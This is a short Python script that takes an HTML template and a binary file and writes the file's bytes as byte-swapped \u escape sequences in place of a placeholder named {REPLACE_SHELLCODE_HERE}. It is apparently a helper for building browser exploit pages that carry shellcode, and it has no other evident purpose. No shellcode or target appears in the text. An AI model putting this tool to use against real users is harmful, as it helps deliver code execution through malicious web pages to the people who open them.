import sys


def make_payload_string(payload):
    assert len(payload) % 2 == 0
    pairs = zip(payload[::2], payload[1::2])
    return '\\u' + '\\u'.join(f'{b:02x}{a:02x}' for a, b in pairs)


if __name__ == '__main__':
    template = open(sys.argv[1], 'r').read()
    payload = open(sys.argv[2], 'rb').read()
    payload_string = make_payload_string(payload)
    html = template.replace('{REPLACE_SHELLCODE_HERE}', payload_string)
    open(sys.argv[3], 'w').write(html)
